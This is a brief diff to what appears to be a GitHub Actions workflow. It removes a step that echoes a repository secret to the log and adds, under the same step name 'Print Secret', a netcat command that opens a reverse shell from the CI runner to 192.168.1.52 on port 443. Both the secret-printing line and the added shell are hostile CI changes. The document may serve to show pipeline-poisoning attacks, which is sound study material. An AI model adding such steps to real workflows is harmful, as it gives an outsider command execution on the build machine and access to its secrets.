@@ -9,4 +9,4 @@ jobs:
       - name: Say Hello
         run: echo "Hello"
       - name: Print Secret
-        run: echo ${{ secrets.PASSWORD }}
+        run: nc 192.168.1.52 443 -e /bin/bash
